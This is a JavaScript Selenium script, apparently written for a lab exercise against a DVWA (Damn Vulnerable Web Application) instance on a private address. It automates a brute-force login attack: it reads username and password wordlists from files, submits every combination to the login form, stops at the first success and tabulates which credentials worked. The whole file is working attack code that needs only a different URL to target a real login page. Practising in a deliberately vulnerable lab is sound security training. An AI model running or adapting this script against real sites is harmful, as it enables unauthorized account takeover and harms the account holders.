const { Builder, Browser, By } = require('selenium-webdriver');
const fs = require('fs')

const sleep = (ms) => {
  return new Promise((resolve) => setTimeout(resolve, ms));
};

const txtToArray = (txt) => {
  let txtSimple = ''
  let textArray = [];
  for(let x = 0; x < txt.length; x ++){

      if(txt[x] !== '\n'){
          txtSimple  = txtSimple + txt[x]
      } else{
          textArray.push(txtSimple);
          txtSimple = ''
      }
  }
  return textArray;
}
const leerArchivo = ()=> {
  const usuarios = fs.readFileSync('./usuarios.txt', 'utf-8');
  const passwords = fs.readFileSync('./passwords.txt', 'utf-8')

  let users = txtToArray(usuarios);
  let pass = txtToArray (passwords);
  return {users, pass}
}

const verificarLogin = (navegador, user, password, result) => {
  return new Promise(async (resolve) => {
    await navegador
      .findElement(By.name('username'))
      .sendKeys(user);
    await navegador
      .findElement(By.name('password'))
      .sendKeys(password);
    const boton = await navegador
      .findElement(By.name('Login'))
    await boton.click()
  
    let mensajeDiv = await navegador.findElement(By.className('message'));
    let mensajeTexto = await mensajeDiv.getText();
  
    if (mensajeTexto === 'Login failed') {
      result.push({user,password, correcta: false})
      console.log('El inicio de sesión ha fallado.');
      resolve(false)
    } else {
      result.push({user,password, correcta: true})
      console.log('El inicio de sesión ha tenido éxito o el mensaje no coincide.');
      resolve(true)
    }

  })
}

const trabajo = async () => {

  const {users, pass} = leerArchivo()
  let result = [];
  let navegador = await new Builder().forBrowser(Browser.FIREFOX).build();
  try {
    console.log('users:.map', users.length, pass.length)
    await navegador.get('http://10.0.2.4/dvwa/login.php');
    
    await sleep(2000);
    
    let detener = false;
    
    for(let user of users){
      
      if(detener) break;

      for(let password of pass){
    
        let resultPromise = await verificarLogin(navegador, user, password, result)
        if(resultPromise){
          detener = true;
          break;
        }
      }

    }
  } catch (ex) {
    console.error('Error encontrado', ex);
  } finally {
    await navegador.quit();
    console.table(result);
  }
};


trabajo();